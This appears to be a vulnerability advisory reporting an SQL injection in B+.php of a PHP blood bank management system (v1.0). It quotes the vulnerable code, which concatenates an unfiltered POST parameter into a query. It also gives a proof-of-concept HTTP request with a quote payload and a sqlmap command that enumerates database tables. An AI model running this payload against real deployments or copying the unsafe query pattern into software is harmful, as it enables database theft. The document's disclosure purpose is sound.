# blood-bank-system-in-php-sql_injection

[Blood Bank System In PHP With Source Code - Source Code & Projects (code-projects.org)](https://code-projects.org/blood-bank-system-in-php-with-source-code/)

## NAME OF AFFECTED PRODUCT(S)

**blood-bank-system-in-php**

## Vendor Homepage

https://code-projects.org/blood-bank-system-in-php-with-source-code/

##  **Manufacturers sites**

https://code-projects.org/

## AFFECTED  VERSION(S)

### Vulnerable File

B+.php  

### VERSION(S)

-  v1.0

### Software Link

https://download.code-projects.org/details/09f1f26e-072d-4fec-bd3b-974076ee162c

## PROBLEM TYPE

network remote.

## Vulnerability Type

sql injection

## Root Cause

B+.php file, SQL injection is used to obtain database information.

## Impact

## **Description of the vulnerability**

### B+.php

source code，the    bloodname parameter is not filtered and concatenated into the SQL statement.                                                                                                                                                                                                                                                                                                                                                                                                                                                               

```
$Bloodname=$_POST['Bloodname'];
$availability=$_POST['Availibility'];
$unit=$_POST['unit'];
$s = "select * from b where Bloodname= '$Bloodname'";
$result = mysqli_query($con, $s);
$num = mysqli_fetch_row($result);
```

![image-20240923201359715](https://github.com/user-attachments/assets/54e03765-2ae4-48d1-a058-4ecb6b790bbf)

   



## **Vulnerability recurrence**

### **POC**

```
POST /admin/blood/update/B+.php HTTP/1.1
Host: bloodbankmgmtsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 14
Origin: http://bloodbankmgmtsystem
Connection: close
Referer: http://bloodbankmgmtsystem/admin/blood/update/B+.php
Cookie: PHPSESSID=bv5nqil12pgkdbgs2s0i6sh3j1
Upgrade-Insecure-Requests: 1
Priority: u=0, i

Bloodname=1%27
```

save as sql.txt

```
python sqlmap.py -r "D:\sql.txt"    --tables
```

![image-20240923201240396](https://github.com/user-attachments/assets/bcea9b77-f448-4aa2-8a5c-805b9932e6af)

